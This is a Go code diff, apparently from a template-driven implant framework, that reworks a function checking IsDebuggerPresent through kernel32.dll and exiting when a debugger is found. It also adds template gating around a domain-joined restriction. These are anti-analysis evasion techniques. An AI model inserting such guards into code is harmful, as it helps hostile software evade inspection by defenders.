@@ -6,7 +6,10 @@ import (
 	// {{else}}{{end}}
 	"os"
 	"syscall"
+
+	// {{if .LimitDomainJoined}}
 	"unsafe"
+	// {{else}}{{end}}
 )
 
 // {{if .LimitDomainJoined}}
@@ -25,16 +28,14 @@ func isDomainJoined() (bool, error) {
 // {{end}}
 
 func PlatformLimits() {
-	kernel32, _ = syscall.LoadLibrary("kernel32.dll")
-	defer syscall.FreeLibrary(kernel32)
-	isDebuggerPresent, _ = syscall.GetProcAddress(kernel32, "IsDebuggerPresent")
-	ret, _, err := syscall.Syscall(uintptr(isDebuggerPresent))
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	isDebuggerPresent := kernel32.MustFindProc("IsDebuggerPresent")
+	var nargs uintptr = 0
+	ret, _, _ := isDebuggerPresent.Call(nargs)
 	// {{if .Debug}}
-	log.Printf("IsDebuggerPresent = %#v", ret)
+	log.Printf("IsDebuggerPresent = %#v\n", int32(ret))
 	// {{end}}
-	// {{if .PlatformLimits}}
-	if err == nil && ret {
+	if int32(ret) != 0 {
 		os.Exit(1)
 	}
-	// {{end}}
 }
